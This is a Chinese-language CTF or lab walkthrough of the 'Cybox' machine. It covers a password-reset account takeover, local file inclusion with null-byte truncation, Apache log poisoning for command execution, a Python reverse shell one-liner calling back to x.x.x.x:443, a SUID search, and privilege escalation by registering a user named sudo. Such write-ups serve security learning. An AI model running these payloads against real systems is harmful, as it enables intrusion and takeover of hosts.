# 0x03 web渗透

首先在http://monitor.cybox.company/register.php上注册一个账号

![](../Images/f4cdeab4f6b16a9b187c937df131cd64.png)

登陆后发现是一个创建条目记录时间的，没啥东西

![](../Images/2e571bd81a621f4a8a16ce33022e120f.png)

然后我们退出登陆，试下一开始主页的邮箱。

![](../Images/b12956c32d0c520e1cba0db6f4bb9d6f.png)

发现密码不匹配，我们尝试一下不存在的用户，发现是没有找到此邮箱，说明用户admin是存在的，我们先放着。

![](../Images/dacaa537041a66f7271d2d5a0ea5bb4b.png)

下面有个忘记密码，想着之前不是发现有一个邮箱页面，可能可以用他找回密码。

![](../Images/f2f4c63ad86efaed10ba4427af63448d.png)

我们先尝试用之前注册的账号登陆webmail页面

![](../Images/1a59df49b4d366ba8ad63599af4e6bdf.png)

显示账号密码不匹配，说明这两个页面不是共用一个账户的。还记得我们还得到了一个register的页面，我们创建一个同名的账户

![](../Images/86ab16c17145306dac081362e0063a5a.png)

创建账户成功，然后账号密码都是相同的。我们登陆webmail页面发现登陆成功，然后在收件箱中我们可以找到找回密码的链接

![](../Images/e0520611f28ba5b21de4682aff172f17.png)

我们可以修改一下邮件，把他邮箱号改成admin@cybox.company，看看是否为越权漏洞，发现还真可以

![](../Images/58fee54c2bfb2c69146af0818240a59d.png)

登陆后，发现有个admin控制面板

![](../Images/8218cc891226907602ae2f4161457aae.png)

我们访问控制面板，发现还在开发中

![](../Images/640037994d23ea15672c7f35c16bd50e.png)

查看源代码，发现有个文件有包含

![](../Images/2f752fb772f9c0bbffb412aff8db38f7.png)

我们尝试使用文件包含漏洞，显示出etc/passwd文件内容，直接访问的话是空白的，可能是拼接了啥后缀，我们使用00截断去截断后缀

![](../Images/2ac1cbeb7bf96832d9c0f88e6d7c6a0a.png)

然后我们查看一下apache日志文件

```
view-source:http://monitor.cybox.company/admin/styles.php?style\=../../../../../../opt/bitnami/apache2/logs/access\_log%00
```

![](../Images/4ac54d69d7d755a8b300efeefbcbf1c4.png)

看日志记录的都是ftp.cybox.company页面的请求信息，经过询问朋友得知，可以通过日志解析+文件包含漏洞执行命令并显示在日志上。（总的来说就是日志包含漏洞）接下来就是利用

我们随便刷新一下，burp拦截ftp页面，然后写上马

![](../Images/a5cfa038f4e3a8bb0655511ec865fb20.png)

```
view-source:http://monitor.cybox.company/admin/styles.php?style\=../../../../../../opt/bitnami/apache2/logs/access\_log%00&s\=ls
```

我们随便执行一个ls命令，发现居然可以解析

![](../Images/cf6961beb77cb97f7ddacdbfad2b0efd.png)

我们用python写一个反弹shell命令并执行：

```
python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("x.x.x.x",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
```

然后反弹shell成功

![](../Images/0480846a8a578bec7ab6bbdca6f65478.png)

最好升级一下shell会话，使用完全交互式TTY

```
python \-c 'import pty; pty.spawn("/bin/bash")'
```

![](../Images/ee6d8ac1e4647e65005e8602213ecaed.png)

# 0x04 权限提升

查找一下有权限的文件

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/091d94d8c88bb2618dd247e773176bb2.png)

发现一个文件比较可疑：/opt/registerlanuncher，cat一下发现是乱码的，我们用strings查看

发现有个/opt/register敏感文件

![](../Images/434d6ac99aef7dafd22e043c80f9dcb0.png)

我们查看一下

![](../Images/69262c68f9de404ce57678fe11f9f3d2.png)

看起来好像是一个创建用户的脚本，跟之间那个register页面进行交互的。

我们切换一下之前注册的xxh用户，发现可以正常切换

![](../Images/bfe4c0004356661d0a9f2d8161fcad44.png)

使用sudo -i提权时失败，显示没有权限查看sudoers文件

![](../Images/537dc650f7ce88109f4266b0d5975c75.png)

我们可以尝试在register创建新用户为sudo

![](../Images/a838e985063f792d7d8cb2c3c82ef1d3.png)

然后切换到sudo用户

![](../Images/96578f0cee4d3794c45c6b3da1fa3eb2.png)
